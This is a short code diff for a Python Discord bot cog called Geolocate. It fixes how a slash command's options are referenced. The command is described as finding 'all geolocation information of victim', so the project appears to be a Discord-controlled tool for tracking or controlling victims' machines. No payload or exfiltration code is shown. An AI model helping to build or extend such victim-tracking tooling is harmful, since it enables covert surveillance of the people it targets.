@@ -12,7 +12,7 @@ class Geolocate(commands.Cog):
         
     @commands.slash_command(
         description="Finds all geolocation information of victim",
-        options=[self.bot.victim],
+        options=[bot.victim],
     )
     async def get_geolocation(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
